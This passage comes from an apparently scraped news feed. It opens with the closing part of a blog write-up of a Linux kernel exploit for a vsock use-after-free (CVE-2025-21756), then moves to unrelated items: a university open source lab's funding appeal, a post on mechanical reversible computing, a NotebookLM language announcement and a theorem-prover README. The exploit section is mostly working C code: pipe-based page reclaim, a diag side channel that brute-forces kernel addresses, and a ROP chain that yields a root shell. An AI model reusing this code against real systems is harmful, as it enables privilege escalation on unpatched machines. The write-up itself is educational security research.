    <p>Since our freed socket is still in the bind table, there are only two checks keeping us from dumping some information from the socket. The <code>sk-&gt;sk_state</code> check is easy to pass (not requiring any leaks), but the <code>sk_net</code> check seems tougher. How can we forge a <code>sk-&gt;__sk_common-&gt;skc_net</code> pointer without having a kASLR leak yet? This is where I was stuck for around a week, but was able to overcome this difficulty thanks to help from the community on discord!</p>
    <h2>Diag Dump Sidechannel For Fun &amp; Profit</h2>

    <p>Stuck in my tracks, I resorted to the kernelctf community, sharing the above checks on the discord. Almost immediately, @h0mbre responded with the idea of brute forcing the <code>skc_net</code> pointer, essentially using <code>vsock_diag_dump</code> as a side channel! Brilliant 🤯!</p>

    <img src="https://hoefler.dev/articles/img/h0mbre.png" alt="">

    <p>So in summary, we do the following to leak <code>init_net</code>...</p>

    <ol>
    <li><p>Spray pipes to reclaim the UAF'd socket's page</p></li>

    <li><p>Fill each pipe buffer QWORD-by-QWORD with controlled values</p></li>

    <li><p>Use vsock_diag_dump() as a side channel to detect if our overwritten struct is “valid enough” to bypass filtering</p></li>

    <li><p>Once vsock_diag_dump() stops reporting our socket, we know we corrupted skc_net</p></li>

    <li><p>We then brute force the lower bits of init_net until the socket is accepted again—giving us a full kASLR bypass</p></li></ol>
    
    <p>The suggestion to use pipe backing pages by @h0mbre turned out to be way more stable/usable than the <code>msg_msg</code> objects I was using before. With a little bit of work, I was able to get the following code to sucessfully leak the <code>sk_net</code> pointer.</p>
    <pre><code>
int junk[FLUSH];
for (int i = 0; i &lt; FLUSH; i++)
    junk[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

puts("[+] pre alloc sockets");
int pre[PRE];
for (int i = 0; i &lt; PRE; i++)
    pre[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

// ... snip ... (alloc target &amp; trigger uaf)

puts("[+] fill up the cpu partial list");
for (int i = 4; i &lt; FLUSH; i += OBJS_PER_SLAB)
    close(junk[i]);

puts("[+] free all the pre/post alloc-ed objects");
for (int i = 0; i &lt; POST; i++)
    close(post[i]);
for (int i = 0; i &lt; PRE; i++)
    close(pre[i]);
    </code></pre>
    <p>The pre &amp; post allocation of objects ensures that the entire page is actually returned to the buddy allocater (see <a href="https://kaligulaarmblessed.github.io/post/cross-cache-for-lazy-people/">this</a> writeup). Below is the code to actually find the <code>skc_net</code> pointer.</p>
    <pre><code>
int pipes[NUM_PIPES][2];
char page[PAGE_SIZE];
memset(page, 2, PAGE_SIZE); // skc_state must be 2

puts("[+] reclaim page");

int w = 0;
int j;
i = 0;
while (i &lt; NUM_PIPES) {

    sleep(0.1);

    if (pipe(&amp;pipes[i][0]) &lt; 0) {
        perror("pipe");
        break;
    }

    printf(".");
    fflush(stdout);


    w = 0;
    while (w &lt; PAGE_SIZE) {
        ssize_t written = write(pipes[i][1], page, 8);
        j = query_vsock_diag();
        w += written;
        if (j != 48) goto out;
    }
    i++;
    if (i % 32 == 0) puts("");
}
    </code></pre>
    <p>As you can see, this code just keeps creating new pipes and populating them one QWORD at a time (0x0202020202020202 to satisfy <code>skc_state</code>), until <code>vsock_diag_dump</code> doesn't find the victim socket anymore. This means that we have overwritten <code>skc_net</code>. Once we actually overwrite the pointer, we just need to brute force the lower 32-bits of the address in the same fasion.</p>
    <pre><code>
long base = 0xffffffff84bb0000; // determined through experimentation
long off = 0;
long addy;
printf("[+] attempting net overwrite (aslr bypass).\n");

while (off &lt; 0xffffffff) {


    close(pipes[i][0]);
    close(pipes[i][1]);

    if (pipe(&amp;pipes[i][0]) &lt; 0) {
        perror("pipe");
    }

    addy = base + off;

    write(pipes[i][1], page, w - 8);
    write(pipes[i][1], &amp;addy, 8);

    if (off % 256 == 0) {
        printf("+");
        fflush(stdout);
    }

    j = query_vsock_diag();
    if (j == 48) {
        printf("\n[*] LEAK init_net @ 0x%lx\n", base + off);
        goto out2;
    }

    off += 128;

}
    </code></pre>

    <p>With the <code>skc_net</code> overwrite, we have killed two birds with one stone. We defeat kASLR and land at a known offset in our vsock object.</p>
        <img src="https://hoefler.dev/articles/img/twobirds.jpg">
	<p>Now all that is left is to find a reliable way to redirect execution flow...</p>  
    <h2>Controlling RIP</h2>
    <p>To control the instruction pointer, I resorted to the <code>vsock_release</code> function, since it is one of the few vsock functionalities not protected by apparmor.</p>
    <pre><code>
static int vsock_release(struct socket *sock)
{
	struct sock *sk = sock-&gt;sk;

	if (!sk)
		return 0;

	sk-&gt;sk_prot-&gt;close(sk, 0);
	__vsock_release(sk, 0);
	sock-&gt;sk = NULL;
	sock-&gt;state = SS_FREE;

	return 0;
}
    </code></pre>
    <p>We are most interested in the call to <code>sk-&gt;sk_prot-&gt;close(sk, 0)</code>. Since we control sk, we need a valid <i>pointer to a pointer to a function</i>. This had me stumped for a while, until I started thinking about using the other valid proto objects. I found that <code>raw_proto</code> had a pointer to an abort function shown below.</p>
    <pre><code>
int raw_abort(struct sock *sk, int err)
{
	lock_sock(sk);

	sk-&gt;sk_err = err;
	sk_error_report(sk);
	__udp_disconnect(sk, 0);

	release_sock(sk);

	return 0;
}
    </code></pre>
    <p>This function calls into <code>sk_error_report</code>, which is shown below.</p>
    <pre><code>
void sk_error_report(struct sock *sk)
{
	sk-&gt;sk_error_report(sk);

	switch (sk-&gt;sk_family) {
	case AF_INET:
		fallthrough;
	case AF_INET6:
		trace_inet_sk_error_report(sk);
		break;
	default:
		break;
	}
}
    </code></pre>
    <p>So if we can overwrite the <code>sk-&gt;sk_error_report</code> field of our socket with a stack pivot gadget, we should be able to jump to a ROP chain starting at the base of the socket.</p>
<img src="https://hoefler.dev/articles/img/ropping.jpg" alt="">
<p>A nice visualization of the state of the vsock after the overwrite is below.</p>
    <pre>sk-&gt;sk_prot --&gt; &amp;raw_proto
              ↳ .close = raw_abort
                          ↳ sk-&gt;sk_error_report(sk) → *stack pivot*
</pre>
        
    <p>Another important mention is that it became necessary to forge the <code>sk_lock</code> member with some null bytes and pointers (determined through lots of debugging). With all of this figured out, I constructed the following ROP chain.</p>
    <pre><code>
long kern_base = base + off - 0x3bb1f80;
printf("[*] leaked kernel base @ 0x%lx\n", kern_base);

// calculate some rop gadgets
long raw_proto_abort = kern_base + 0x2efa8c0;
long null_ptr = kern_base + 0x2eeaee0;
long init_cred = kern_base + 0x2c74d80;
long pop_r15_ret = kern_base + 0x15e93f;
long push_rbx_pop_rsp_ret = kern_base + 0x6b9529;
long pop_rdi_ret = kern_base + 0x15e940;
long commit_creds = kern_base + 0x1fcc40;
long ret = kern_base + 0x5d2;

// info for returning to usermode
long user_cs = 0x33;
long user_ss = 0x2b;
long user_rflags = 0x202;
long shell = (long)get_shell;

uint64_t* user_rsp = (uint64_t*)get_user_rsp();

// return to user mode
long swapgs_restore_regs_and_return_to_usermode = kern_base + 0x16011a6;

//getchar();

printf("[+] writing the rop chain\n");

close(pipes[i][0]);
close(pipes[i][1]);

if (pipe(&amp;pipes[i][0]) &lt; 0) {
    perror("pipe");
}

printf("[+] writing payload to vsk\n");
write(pipes[i][1], page, w - 56);

char buf[0x330];
memset(buf, 'A', 0x330);
char not[0x330];
memset(not, 0, 0x330);

// create the rop chain!
write(pipes[i][1], &amp;pop_rdi_ret, 8); // stack pivot target
write(pipes[i][1], &amp;init_cred, 8);
write(pipes[i][1], &amp;ret, 8); 
write(pipes[i][1], &amp;ret, 8);
write(pipes[i][1], &amp;pop_r15_ret, 8); // junk
write(pipes[i][1], &amp;raw_proto_abort, 8); // sk_prot (calls sk-&gt;sk_error_report())
write(pipes[i][1], &amp;ret, 8);
write(pipes[i][1], &amp;commit_creds, 8); // commit_creds(init_cred);
write(pipes[i][1], &amp;swapgs_restore_regs_and_return_to_usermode, 8);
write(pipes[i][1], &amp;null_ptr, 8); // rax
write(pipes[i][1], &amp;null_ptr, 8); // rdi
write(pipes[i][1], &amp;shell, 8); // rip
write(pipes[i][1], &amp;user_cs, 8);
write(pipes[i][1], &amp;user_rflags, 8);
write(pipes[i][1], user_rsp, 8); // rsp
write(pipes[i][1], &amp;user_ss, 8);
write(pipes[i][1], buf, 0x18);
write(pipes[i][1], &amp;\not, 8); // sk_lock
write(pipes[i][1], &amp;\not, 8); // sk_lock
write(pipes[i][1], &amp;null_ptr, 8); // sk_lock
write(pipes[i][1], &amp;null_ptr, 8); // sk_lock
write(pipes[i][1], buf, 0x200);
write(pipes[i][1], &amp;push_rbx_pop_rsp_ret, 8); // stack pivot [sk_error_report()]

//getchar();

close(s); // trigger the exploit!
    </code></pre>
    <p>Notice that I did not call <code>prepare_kernel_cred(NULL)</code> since this is no longer supported (causes a crash). Instead I opted to call <code>commit_creds</code> with <code>init_cred</code> - a structure with a constant offset from the kernel base possessing uid=gid=0. I also borrowed the swapgs_restore_regs_and_return_to_usermode technique from <a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">this</a> blog. With all of those puzzle pieces in place, our exploit gives a root shell!</p>
    <img src="https://hoefler.dev/articles/img/pwned.png" alt="">
    <p>The final source code for the exploit is posted <a href="https://github.com/hoefler02/CVE-2025-21756/blob/main/x.c">here</a>. The exploit could still be much more reliable and elegant, but for my first kernel pwn I am happy with it!</p>
    <h2>Thank You!</h2>
    <p>For a bug involving just a few lines of patch code, this journey taught me way more about the kernel than I ever could have expected! I could never have completed this exploit without all of the super helpful hackers on the #kernelctf discord channel! Thank you all + happy pwning!</p>
    

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Future of OSU Open Source Lab in Jeopardy (150 pts)]]></title>
            <link>https://osuosl.org/blog/osl-future/</link>
            <guid>43849271</guid>
            <pubDate>Wed, 30 Apr 2025 18:51:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://osuosl.org/blog/osl-future/">https://osuosl.org/blog/osl-future/</a>, See on <a href="https://news.ycombinator.com/item?id=43849271">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>I am writing to inform you about a critical and time-sensitive situation facing the Open Source Lab. Over the past
several years, we have been operating at a deficit due to a decline in corporate donations. While the Oregon State
College of Engineering (CoE) has generously filled this gap, recent changes in university funding makes our current
funding model no longer sustainable. As a result, our current funding model is no longer sustainable and CoE needs to
find ways to cut programs.</p><p>Earlier this week, I was informed that unless we secure $250,000 in committed funds, the OSL will be forced to shut
down later this year. I have reached out to our largest corporate sponsor and they are working to increase their
support as we update our contract, but that still may not be enough.</p><p>For transparency, the $250,000 is broken down into the following roughly:</p><ul><li>Staff pay $150k (60%) (1 staff)</li><li>Student pay $65k (26%) (8 students)</li><li>Other expenses $35k (14%)</li></ul><p>Other expenses include items such as hardware, travel, subscription services and other miscellaneous expenses needed to
run the OSL day to day.</p><p>If any of you can assist or connect me with potential supporters, please reach out as soon as possible. I need to
provide leadership with an update on any funding changes by <strong>Wednesday, May 14, 2025</strong>. Please reach out directly via
<em><strong><a href="mailto:donations@osuosl.org">donations@osuosl.org</a></strong></em> if you’re able to help us make it through this difficult time.</p><p>The OSU Foundation is an IRS 501(c)(3) nonprofit corporation, which provides many donors a tax advantage. Please
contact the OSU Foundation directly if you have questions about your eligibility. You can donate directly to us by
visiting our <a href="https://osuosl.org/donate">donation page</a>.</p><p>OSL provides hosting for over 500 Free and Open Source Projects from all over the world. Over the course of its 22-year
existence, the OSL has mentored over 130 students, many of whom have gone on to create their own companies and work
throughout the larger tech ecosystem.</p><p>Some notable milestones over the years include:</p><ul><li>Provided hosting for Mozilla Firefox when they needed help in the early days and hosted the release of 1.0</li><li>Was the home of the Apache Software Foundation, Linux Foundation, Kernel.org, Mozilla for many years</li><li>Offers fast and reliable software mirroring for projects</li><li>Currently provides infrastructure hosting for projects such as Drupal, Gentoo Linux, Debian, Fedora, phpBB, OpenID,
Buildroot/Busybox, Inkscape, Cinc and many more!</li><li>Virtual machines for x86, aarch64 and ppc64le are used by many projects for CI and other hosted services</li></ul><p>Additionally, the university has long-term plans to deprecate the data center where all of our hosting is currently
located. Much of the university hosting has been moved to the cloud or the state data center, and OSU lacks the funds
to replace the aging UPS/HVAC systems. I am actively seeking a new location to host our systems, but finding suitable
data center space on campus has proven to be extremely challenging.</p><p>To be clear: OSL’s immediate need is securing additional funding, the data center situation can be worked on later.
Your commitment is crucial for us to move forward. I am available to answer any questions you might have.</p><p>Thank you for your continued support!</p><p>Lance Albertson, Director</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reversible computing with mechanical links and pivots (107 pts)]]></title>
            <link>https://tennysontbardwell.com/blog/2025/04/30/mechanical-computing/index.html</link>
            <guid>43848398</guid>
            <pubDate>Wed, 30 Apr 2025 17:35:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tennysontbardwell.com/blog/2025/04/30/mechanical-computing/index.html">https://tennysontbardwell.com/blog/2025/04/30/mechanical-computing/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=43848398">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">




<div id="outline-container-org1dc929b">
<h2 id="org1dc929b">Intro</h2>
<div id="text-org1dc929b">
<p>
With the concern that “Moore’s Law is dead,” new interest has grown for unconventional forms of computing. This includes:
</p>

<ul>
<li><a href="https://en.wikipedia.org/wiki/Quantum_computing">quantum computing</a> (for atomic simulations and specific NP approximation algorithms)</li>
<li><a href="https://en.wikipedia.org/wiki/Analog_computer">analog computing</a> (for fast-and-efficient-but-error-prone computation, such as neural net inference)</li>
<li><a href="https://en.wikipedia.org/wiki/Reversible_computing">reversible computing</a> (for maximum energy efficiency)</li>
</ul>

<p>
It is believed that the most efficient computing devices would use little or no entropy during reversible computations, and only consume energy during non-reversible parts of computation. Specifically, the <a href="https://en.wikipedia.org/wiki/Landauer%27s_principle">Landauer’s principle</a> states that all non-physically-reversible computation operations consume at least \(2.9 \times 10^{-21}\) J of energy at room temperature (and less as the temperature drops).
</p>

<p>
Are we at the theoretical maximum efficiency yet? No. Using some back-of-the-napkin math:
</p>

<ul>
<li>AMD Ryzen Threadripper 7995WX has about 12 TFLOPS of FP32 (single-precision) compute (<a href="https://wccftech.com/amd-ryzen-threadripper-7995wx-cpu-more-fp32-tflops-than-xbox-series-x-ps5-on-par-rtx-3060-gpu/">link</a>)</li>
<li>Assuming 30 irreversible computations per FP32 operation (from Claude), we have 10<sup>14.5</sup> irreversible computations per second</li>
<li>At 350 W this is about \(10^{-12}\) J per irreversible computation, or about <i>9 orders of magnitude</i> less efficient than the theoretical maximum</li>
</ul>

<p>
Even if a CPU like the AMD Ryzen Z1 Extreme or Apple M4 can improve this efficiency by a factor of 10 (which is too generous), we’re still a long way out from hitting the theoretical wall.
</p>

<p>
Nevertheless, it is both fun and prudent to imagine how different paradigms of computing would work. These different paradigms might even be competitive in certain niches long before transistors hit a wall. My favorite reversible computing scheme comes from a paper named <a href="https://doi.org/10.48550/arXiv.1801.03534">Mechanical Computing Systems Using Only Links and Rotary Joint</a>. In it, they use <i>links</i> and <i>rotary joints</i> (hinges) to build Turing-complete computing machines.
</p>
</div>
</div>
<div id="outline-container-orged82550">
<h2 id="orged82550">The “Lock”</h2>
<div id="text-orged82550">
<p>
The most basic element is a “lock.” It’s constructed with two triangles that are allowed to slide back and forth. However, once the top triangle has been pushed forward, it prevents the bottom triangle from being pushed forward (and vice versa). It’s called a “lock” because the first triangle to get pushed forward will “lock out” the other.
</p>

<p>
The demo below is made from springs and pivot points. Drag the sliders to engage the top and bottom parts of a lock.
</p>



<p><label for="slider-a">Top Input:</label>
  
</p>
<p><label for="slider-b">Bottom Input:</label>
  
</p>

<canvas id="sim1" width="750" height="230"></canvas>



<p>
In principle, these locks could be constructed out of physical materials on very small scales. The authors of the original paper provided this example schematic of a 30 x 30 x 7 nm lock constructed out of carbon:
</p>


<p><img src="https://tennysontbardwell.com/blog/2025/04/30/mechanical-computing/atomic.png" alt="atomic.png">
</p>
</div>
</div>
<div id="outline-container-org85972e1">
<h2 id="org85972e1">The “Balance”</h2>
<div id="text-org85972e1">
<p>
Ultimately, our binary convention will be that either the “1” line or the “0” line of a bit will always be engaged. A balance helps make this happen. It consists of two locks and a lever before them. On the forward edge of a clock, it forces a horizontal translation through whichever lock is not already engaged.
</p>

<p>
Try engaging only one of the two locks (top or bottom) and then engaging the clock. The clock will “flow through” whichever lock has not already been engaged by the inputs:
</p>



<p><label>Top Input:</label>
  
</p>
<p><label>Bottom Input:</label>
  
</p>
<p><label>Clock Input:</label>
  
</p>

<canvas id="sim2" width="750" height="280"></canvas>


</div>
</div>
<div id="outline-container-org61cfdc6">
<h2 id="org61cfdc6">Bellcrank</h2>
<div id="text-org61cfdc6">
<p>
The last thing that we will need to construct a NAND gate is a way to route and split signals. It turns out to be relatively simple:
</p>


<p><label>Input:</label>
  
</p>

<canvas id="sim3" width="750" height="450"></canvas>


</div>
</div>
<div id="outline-container-org627b816">
<h2 id="org627b816">NAND Simulation</h2>
<div id="text-org627b816">
<p>
And now we are ready to construct a NAND gate, which is a “universal gate” (i.e., you can implement any truth table using only NAND gates). We first use two “wires” for each input. If <code>A</code> is <code>TRUE</code>, then the first wire is pushed forward. If <code>A</code> is <code>FALSE</code>, then the second wire is pushed forward. Likewise, if <code>B</code> is <code>TRUE</code> then the third wire is pushed forward, and the fourth wire is pushed forward if <code>B</code> is <code>FALSE</code>.
</p>

<p>
We expect to always have exactly two of these wires push forward for any computation. Following these input wires, we see that each individual wire engages exactly two locks, preventing the thrust of the clock from flowing through that pathway. Since there are four pathways, we must make sure that only one pathway is unlocked at any time. Then, when the clock arrives, that pathway will receive the forward thrust.
</p>


</div>


<canvas id="simulator" width="750" height="380"></canvas>



<p>
If you’re interested in learning more, one of the authors gave a 20 minute overview of this paper at the CCC Workshop on Reversible Computing: <a href="https://www.youtube.com/watch?v=yVX9Ob4SjGA">Ralph Merkle: Molecular Mechanical Computing</a>.
</p>
</div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NotebookLM Audio Overviews are now available in over 50 languages (222 pts)]]></title>
            <link>https://blog.google/technology/google-labs/notebooklm-audio-overviews-50-languages/</link>
            <guid>43848325</guid>
            <pubDate>Wed, 30 Apr 2025 17:28:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.google/technology/google-labs/notebooklm-audio-overviews-50-languages/">https://blog.google/technology/google-labs/notebooklm-audio-overviews-50-languages/</a>, See on <a href="https://news.ycombinator.com/item?id=43848325">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="jump-content" tabindex="-1">
            

    
    

    <article>

    
    





    

    
      

<div data-analytics-module="{
    &quot;module_name&quot;: &quot;Hero Menu&quot;,
    &quot;section_header&quot;: &quot;NotebookLM Audio Overviews are now available in over 50 languages&quot;
  }">
  
  <div>
      <div>
          
            <p>Apr 29, 2025</p>
          
          
            <p data-reading-time-render="">[[read-time]] min read</p>
          
        </div>
      
        <p>
          Audio Overviews are now multilingual, and you can try it out today.
        </p>
      
    </div>
  
  <div>
  <p>Arielle Fox</p>
  
    <p>
      Program Manager, Google Labs
    </p>
  
  
</div>
</div>

    

    
      










<div>
    <figure>
      <div>
        <p><img alt="NotebookLM logo surrounded by waveforms and language options like English, বাংলা (Bengali), Nederlands (Dutch), Español (Spanish), العربية (Arabic), and български (Bulgarian), suggesting multilingual capabilities." data-component="uni-progressive-image" fetchpriority="high" height="150px" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ffj.width-200.format-webp.webp" width="360px" data-sizes="(max-width: 1023px) 100vw,(min-width: 1024px and max-width: 1259) 80vw, 1046px" data-srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ffj.width-800.format-webp.webp 800w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ff.width-1200.format-webp.webp 1200w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ff.width-1600.format-webp.webp 1600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ff.width-2200.format-webp.webp 2200w">
        </p>
      </div>
      
    </figure>
  </div>






    

    
    <div data-reading-time="true" data-component="uni-article-body">

            
              





<uni-article-speakable page-title="NotebookLM Audio Overviews are now available in over 50 languages" listen-to-article="Listen to article" data-date-modified="2025-04-30T14:43:57.674112+00:00" data-tracking-ids="G-HGNBTNCHCQ,G-6NKTLKV14N" data-voice-list="en.ioh-pngnat:Cyan,en.usb-pngnat:Lime" data-script-src="https://www.gstatic.com/readaloud/player/web/api/js/api.js"></uni-article-speakable>

            

            
            
<!--article text-->

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;NotebookLM Audio Overviews are now available in over 50 languages&quot;
         }"><p data-block-key="x4y2k">Last year, we expanded NotebookLM to more than 200 countries and now we’re making Audio Overviews available in more than 50 languages.</p><p data-block-key="73jd9"><a href="https://blog.google/technology/ai/notebooklm-audio-overviews/">Audio Overviews</a>, which turn your sources into engaging, podcast-like conversations, were immediately popular when they launched late last year. Now, thanks to Gemini’s native audio support, even more people can use Audio Overviews in their preferred language, from <a href="https://support.google.com/notebooklm/answer/15731776">Afrikaans to Hindi to Turkish — and more.</a> This is an early look at what's possible with this feature — we plan to keep building and refining it based on your feedback.</p></div>
  

  
    
  
    


  <uni-youtube-player-article index="2" thumbnail-alt="NotebookLM audio overviews" video-id="VJg37fVPy9I" video-type="video">
  </uni-youtube-player-article>


  


  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;NotebookLM Audio Overviews are now available in over 50 languages&quot;
         }"><p data-block-key="x4y2k">Audio Overviews are generated in your account’s preferred language. This update also introduces a new "Output Language" option in NotebookLM's settings; your Audio Overviews are always generated in the language you select here. You can change the language at any time and your audio and chat responses will reflect this, making it easy to create multilingual content or study materials as needed.</p><p data-block-key="anamm">For example, a teacher preparing a lesson on the Amazon rainforest can share resources in various languages — like a Portuguese documentary, a Spanish research paper and English study reports — with their students. The students can upload these and can generate an Audio Overview of key insights in their preferred language. This capability breaks down language barriers and makes the information more accessible to everyone.</p></div>
  

  
    






<uni-image-full-width alignment="full" alt-text="notebooklm audio overviewsw language output" external-image="" or-mp4-video-title="Language Output NotebookLM" or-mp4-video-url="https://storage.googleapis.com/gweb-uniblog-publish-prod/original_videos/F405_NLM_StudentBlogAssets_LanguageOutput_1.mp4" section-header="NotebookLM Audio Overviews are now available in over 50 languages" custom-class="image-full-width--constrained-width uni-component-spacing">
  
  
</uni-image-full-width>


  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;NotebookLM Audio Overviews are now available in over 50 languages&quot;
         }">
        <p data-block-key="x4y2k">We hope bringing more languages to Audio Overviews helps you discover new insights and connect with information in your own language. Try it out today at <a href="https://notebooklm.google/">notebooklm.google</a>. Give it a listen, 來聽看看, écoutez!</p>
      </div>
  


            
            

            
              




            
          </div>
  </article>
  





  

  


<div data-component="uni-related-articles" data-analytics-module="{
    &quot;module_name&quot;: &quot;Article Footer Related Stories&quot;,
    &quot;section_header&quot;: &quot;Related stories&quot;
  }">
        <h3>
          <p>
            Related stories
          </p>
        </h3>
      </div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[DeepSeek-Prover-V2 (298 pts)]]></title>
            <link>https://github.com/deepseek-ai/DeepSeek-Prover-V2</link>
            <guid>43847432</guid>
            <pubDate>Wed, 30 Apr 2025 16:23:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/deepseek-ai/DeepSeek-Prover-V2">https://github.com/deepseek-ai/DeepSeek-Prover-V2</a>, See on <a href="https://news.ycombinator.com/item?id=43847432">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text">


<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/logo.svg?raw=true"><img src="https://github.com/deepseek-ai/DeepSeek-V2/raw/main/figures/logo.svg?raw=true" width="60%" alt="DeepSeek-V3"></a>
</p>
<hr>

<p dir="auto">
  <a href="#2-model-summary">Model Summary</a> |
  <a href="#3-proverbench">ProverBench</a> |
  <a href="#4-model-dataset-downloads">Model&amp;Dataset Download</a> |
  <a href="#5-quick-start">Quick Start</a> |
  <a href="#6-license">License</a> |
  <a href="#7-contact">Contact</a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">DeepSeek-Prover-V2: Advancing Formal Mathematical Reasoning via Reinforcement Learning for Subgoal Decomposition</h2><a id="user-content-deepseek-prover-v2-advancing-formal-mathematical-reasoning-via-reinforcement-learning-for-subgoal-decomposition" aria-label="Permalink: DeepSeek-Prover-V2: Advancing Formal Mathematical Reasoning via Reinforcement Learning for Subgoal Decomposition" href="#deepseek-prover-v2-advancing-formal-mathematical-reasoning-via-reinforcement-learning-for-subgoal-decomposition"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">1. Introduction</h2><a id="user-content-1-introduction" aria-label="Permalink: 1. Introduction" href="#1-introduction"></a></p>
<p dir="auto">We introduce DeepSeek-Prover-V2, an open-source large language model designed for formal theorem proving in Lean 4, with initialization data collected through a recursive theorem proving pipeline powered by DeepSeek-V3. The cold-start training procedure begins by prompting DeepSeek-V3 to decompose complex problems into a series of subgoals. The proofs of resolved subgoals are synthesized into a chain-of-thought process, combined with DeepSeek-V3's step-by-step reasoning, to create an initial cold start for reinforcement learning. This process enables us to integrate both informal and formal mathematical reasoning into a unified model.</p>
<p dir="auto">
  <a target="_blank" rel="noopener noreferrer" href="https://github.com/deepseek-ai/DeepSeek-Prover-V2/blob/main/figures/performance.png"><img width="100%" src="https://github.com/deepseek-ai/DeepSeek-Prover-V2/raw/main/figures/performance.png"></a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">2. Model Summary</h2><a id="user-content-2-model-summary" aria-label="Permalink: 2. Model Summary" href="#2-model-summary"></a></p>
<hr>
<p dir="auto"><strong>Synthesize Cold-Start Reasoning Data through Recursive Proof Search</strong></p>
<ul dir="auto">
<li>
<p dir="auto">To construct the cold-start dataset, we develop a simple yet effective pipeline for recursive theorem proving, utilizing DeepSeek-V3 as a unified tool for both subgoal decomposition and formalization. We prompt DeepSeek-V3 to decompose theorems into high-level proof sketches while simultaneously formalizing these proof steps in Lean 4, resulting in a sequence of subgoals.</p>
</li>
<li>
<p dir="auto">We use a smaller 7B model to handle the proof search for each subgoal, thereby reducing the associated computational burden. Once the decomposed steps of a challenging problem are resolved, we pair the complete step-by-step formal proof with the corresponding chain-of-thought from DeepSeek-V3 to create cold-start reasoning data.</p>
</li>
</ul>
<hr>
<p dir="auto"><strong>Reinforcement Learning with Synthetic Cold-Start Data</strong></p>
<ul dir="auto">
<li>
<p dir="auto">We curate a subset of challenging problems that remain unsolved by the 7B prover model in an end-to-end manner, but for which all decomposed subgoals have been successfully resolved. By composing the proofs of all subgoals, we construct a complete formal proof for the original problem. This proof is then appended to DeepSeek-V3's chain-of-thought, which outlines the corresponding lemma decomposition, thereby producing a cohesive synthesis of informal reasoning and subsequent formalization.</p>
</li>
<li>
<p dir="auto">After fine-tuning the prover model on the synthetic cold-start data, we perform a reinforcement learning stage to further enhance its ability to bridge informal reasoning with formal proof construction. Following the standard training objective for reasoning models, we use binary correct-or-incorrect feedback as the primary form of reward supervision.</p>
</li>
<li>
<p dir="auto">The resulting model, DeepSeek-Prover-V2-671B, achieves state-of-the-art performance in neural theorem proving, reaching <math-renderer data-static-url="https://github.githubassets.com/static" data-run-id="10c342b53976c609710245a8ba9916e2">$88.9$</math-renderer>% pass ratio on the MiniF2F-test and solving 49 out of 658 problems from PutnamBench. The proofs generated by DeepSeek-Prover-V2 for the miniF2F dataset are available for download as a <a href="https://github.com/deepseek-ai/DeepSeek-Prover-V2/blob/master/minif2f-solutions.zip">ZIP archive</a>.</p>
</li>
</ul>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">3. ProverBench: Formalization of AIME and Textbook Problems</h2><a id="user-content-3-proverbench-formalization-of-aime-and-textbook-problems" aria-label="Permalink: 3. ProverBench: Formalization of AIME and Textbook Problems" href="#3-proverbench-formalization-of-aime-and-textbook-problems"></a></p>
<p dir="auto">we introduce ProverBench, a benchmark dataset comprising 325 problems. Of these, 15 are formalized from number theory and algebra questions featured in the recent AIME competitions (AIME 24 and 25), offering authentic high-school competition-level challenges. The remaining 310 problems are drawn from curated textbook examples and educational tutorials, contributing a diverse and pedagogically grounded collection of formalized mathematical problems. This benchmark is designed to enable more comprehensive evaluation across both high-school competition problems and undergraduate-level mathematics.</p>
<div dir="auto">
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Area</th>
<th>Count</th>
</tr>
</thead>
<tbody>
<tr>
<td>AIME 24&amp;25</td>
<td>15</td>
</tr>
<tr>
<td>Number Theory</td>
<td>40</td>
</tr>
<tr>
<td>Elementary Algebra</td>
<td>30</td>
</tr>
<tr>
<td>Linear Algebra</td>
<td>50</td>
</tr>
<tr>
<td>Abstract Algebra</td>
<td>40</td>
</tr>
<tr>
<td>Calculus</td>
<td>90</td>
</tr>
<tr>
<td>Real Analysis</td>
<td>30</td>
</tr>
<tr>
<td>Complex Analysis</td>
<td>10</td>
</tr>
<tr>
<td>Functional Analysis</td>
<td>10</td>
</tr>
<tr>
<td>Probability</td>
<td>10</td>
</tr>
<tr>
<td>Total</td>
<td>325</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
</div>
